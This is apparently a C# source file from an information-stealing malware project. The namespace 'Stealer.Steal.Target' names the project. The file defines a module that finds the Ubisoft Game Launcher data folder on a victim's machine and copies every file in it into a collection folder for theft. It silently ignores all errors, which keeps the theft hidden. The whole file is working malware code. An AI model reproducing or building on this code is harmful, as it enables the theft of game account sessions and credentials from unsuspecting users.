using System;
using System.IO;
using Stealer.Steal.Helper;

namespace Stealer.Steal.Target.Browsers;

internal class Uplay
{
	public static string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Ubisoft Game Launcher");

	public static void Start()
	{
		if (!Directory.Exists(Uplay.path))
		{
			return;
		}
		try
		{
			string path = Path.Combine("Gaming", "Uplay");
			Counter.Uplay = true;
			string[] files = Directory.GetFiles(Uplay.path);
			foreach (string text in files)
			{
				DynamicFiles.WriteAllBytes(Path.Combine(path, Path.GetFileName(text)), File.ReadAllBytes(text));
			}
		}
		catch
		{
		}
	}
}
